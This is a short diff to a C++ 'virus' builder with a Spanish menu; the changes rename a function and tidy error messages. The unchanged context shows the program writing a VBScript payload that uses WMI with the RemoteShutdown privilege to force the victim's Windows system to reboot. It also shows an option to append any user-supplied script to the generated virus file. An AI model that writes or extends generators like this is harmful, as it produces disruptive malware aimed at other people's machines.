@@ -21,7 +21,7 @@ void mostrarOpciones()
     std::cout << "5. Terminar virus" << endl;
 }
 
-void showSpanish()
+void vbsSpanish()
 {
     std::ofstream virus;
     char nombreVirus[500];
@@ -34,7 +34,7 @@ void showSpanish()
     catch(const std::exception& e)
     {
         std::cerr << e.what() << '\n';
-        std::cout << "ERROR!, The virus name cannot have spaces!. 0x3" << endl;
+        std::cout << "ERROR!, The virus name cannot have spaces!. 3" << endl;
     }
     
 
@@ -80,6 +80,7 @@ void showSpanish()
             "Set OpSysSet = GetObject(\"winmgmts:{impersonationLevel=impersonate,(RemoteShutdown)}//\" & mname).ExecQuery(\"select * from Win32_OperatingSystem where Primary=true\")"
             endl
             "for each OpSys in OpSysSet"
+            endl
             "   OpSys.Reboot()"
             endl
             "next";
@@ -95,6 +96,7 @@ void showSpanish()
             std::cin >> scriptPersonalizado;
             std::cout << endl;
             virus << endl << scriptPersonalizado;
+            clearConsole
         }
         else if(option == 5)
         {
@@ -105,7 +107,7 @@ void showSpanish()
         }
         else 
         {
-            std::cout << "ERROR 0x4." << endl;
+            std::cout << "ERROR 4." << endl;
             break;
             PAUSE
         }
